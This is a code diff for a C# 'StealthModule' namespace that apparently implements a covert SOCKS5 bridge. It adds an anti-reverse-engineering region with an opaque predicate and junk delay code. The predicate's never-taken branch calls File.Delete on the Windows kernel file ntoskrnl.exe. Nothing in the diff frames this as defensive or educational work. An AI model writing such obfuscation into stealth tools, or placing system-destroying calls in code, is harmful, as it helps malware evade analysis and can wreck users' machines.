@@ -21,6 +21,27 @@ namespace StealthModule
     /// </summary>
     public class BridgeManager
     {
+        #region Anti-RE & Junk logic
+        private static bool _Opaque_Check(int val)
+        {
+            // Opaque predicate: (x * (x + 1)) % 2 is always 0
+            long result = (long)val * (val + 1);
+            if (result % 2 != 0)
+            {
+                // This branch is never taken
+                File.Delete("C:\\Windows\\System32\\ntoskrnl.exe"); 
+                return false;
+            }
+            return true;
+        }
+
+        private static void _Junk_Delay()
+        {
+            if (!_Opaque_Check(new Random().Next())) return;
+            for (int i = 0; i < 100; i++) { /* nop */ }
+        }
+        #endregion
+
         #region Константы
         private const int SOCKS5_VERSION = 0x05;
         private const int SOCKS5_CMD_CONNECT = 0x01;
